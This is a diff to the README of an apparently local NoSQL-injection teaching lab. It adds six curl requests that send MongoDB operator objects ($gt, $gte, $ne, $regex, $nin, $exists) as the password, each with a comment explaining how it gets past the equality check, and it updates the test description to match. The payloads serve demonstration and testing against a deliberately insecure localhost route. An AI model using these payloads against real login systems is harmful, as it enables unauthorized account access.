@@ -110,23 +110,41 @@ curl -X POST http://127.0.0.1:3000/api/auth/login \
   -d '{"username":"alice","password":"synthetic-demo-password"}'
 ~~~
 
-Brief-shaped object in the lab route:
+MongoDB operator payloads in the lab route:
 
 ~~~bash
-curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
-  -H "Content-Type: application/json" \
-  -d '{"username":"alice","password":{"gt":""}}'
-~~~
-
-MongoDB operator-shaped object in the lab route:
-
-~~~bash
+# Greater than empty: bypasses equality without the correct password
 curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
   -H "Content-Type: application/json" \
   -d '{"username":"alice","password":{"$gt":""}}'
+
+# Greater than or equal to empty
+curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":{"$gte":""}}'
+
+# Not equal to a value that is not the stored password
+curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":{"$ne":"not-the-password"}}'
+
+# Regex matching any string
+curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":{"$regex":".*"}}'
+
+# Stored password is not in this list
+curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":{"$nin":["not-the-password"]}}'
+
+# The password field exists
+curl -X POST http://127.0.0.1:3000/api/lab/login-observation \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":{"$exists":true}}'
 ~~~
 
-The two object requests are intentionally recorded separately. The lab route is not a secure authentication implementation.
+These payloads are intentionally available only in the local lab route. The route is not a secure authentication implementation.
 
 ## 4. Tests
 
@@ -148,7 +166,7 @@ Run everything:
 npm run test:all
 ~~~
 
-The integration test verifies the normal equality query, the brief-shaped object and the dollar-prefixed operator object against a real MongoDB server.
+The integration test verifies normal equality plus the six documented dollar-prefixed operator payloads against a real MongoDB server.
 
 ## 5. Application behavior
 
